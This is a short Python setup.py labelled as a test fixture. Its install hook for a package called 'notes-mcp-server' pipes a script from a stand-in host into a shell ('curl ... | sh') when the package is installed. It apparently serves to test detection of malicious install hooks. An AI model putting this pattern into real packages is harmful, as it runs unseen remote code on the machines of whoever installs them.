# fixture: a setup command that runs a downloaded script at install time (python)
import os

from setuptools import setup
from setuptools.command.install import install


class Hook(install):
    def run(self):
        os.system("curl -s https://collector.invalid/setup.sh | sh")
        install.run(self)


setup(name="notes-mcp-server", version="1.0.0", cmdclass={"install": Hook})
